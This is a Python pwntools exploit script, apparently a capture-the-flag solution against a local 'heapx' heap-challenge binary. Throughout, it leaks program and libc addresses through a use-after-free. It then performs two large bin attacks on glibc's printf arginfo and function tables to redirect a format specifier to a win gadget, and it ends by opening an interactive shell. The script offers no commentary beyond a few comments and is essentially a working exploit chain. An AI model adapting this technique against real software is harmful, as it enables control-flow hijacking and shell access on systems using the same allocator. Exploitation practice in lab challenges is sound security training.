from pwn import *

exe = ELF('./publish/heapx')
context.binary = exe

p = remote('localhost', 25004)
#p = gdb.debug(['./publish/heapx'], gdbscript='continue')

libc = ELF('./publish/libc.so.6')

MAIN_ARENA = 0x1e8ac0
MAIN_ARENA_DELTA = 0x60
PRINTF_ARGINFO_T = 0x1ea708
PRINTF_FUNCTION_T = 0x1ea700

one_gadget = 0x28d

log_count = -1

def allocate(size):
	p.sendlineafter(b'> ', f"new {size}".encode())
	p.recvline()
	global log_count
	log_count += 1
	return log_count #id

def free(id):
	p.sendlineafter(b'> ', f"delete {id}".encode())

def write(id, offset, data):
	p.sendlineafter(b'> ', f"write {id} {offset}".encode())
	p.sendlineafter(b': ', data)

def read(id, amount):
	p.sendlineafter(b'> ', f"read {id}".encode())
	return p.recv(amount)

# Leak .rodata to get .text leak
p.sendlineafter(b'> ', b'write 0 0')
p.recvuntil(b'Log #')

exe.address = int(p.recvuntil(b' ').decode('utf-8'), 16) - 0x3060

info(f"win @ {hex(exe.address + one_gadget)}")

p1 = allocate(0x428)
g1 = allocate(0x18)
p2 = allocate(0x418)
g2 = allocate(0x18)

p3 = allocate(0x488)
g3 = allocate(0x18)
p4 = allocate(0x478)
g4 = allocate(0x18)

write(g1, 0, b'/bin/sh\x00')

# Utilize UAF on unsorted bin to leak libc
free(p1)
leak = u64(read(p1, 6).ljust(8, b'\x00'))
info(f"Main arena leak @ {hex(leak)}")

libc.address = leak - MAIN_ARENA - MAIN_ARENA_DELTA

info(f"libc base @ {hex(libc.address)}")
info(f"__printf_function_table @ {hex(libc.address + PRINTF_FUNCTION_T)}")
info(f"__printf_arginfo_table @ {hex(libc.address + PRINTF_ARGINFO_T)}") 

offset = ord('s') - 2

# Perform large bin attack #1
g5 = allocate(0x438)

free(p2)

write(p1, 0x18, p64(libc.address + PRINTF_ARGINFO_T - 0x20))

g6 = allocate(0x438)

# Perform large bin attack #2

write(p4, offset * 8, p64(exe.address + one_gadget))

free(p3)

g7 = allocate(0x498)

free(p4)

write(p3, 0x18, p64(libc.address + PRINTF_FUNCTION_T - 0x20))

g8 = allocate(0x498)

p.sendlineafter(b'> ', f"read {g1}".encode())

p.interactive()

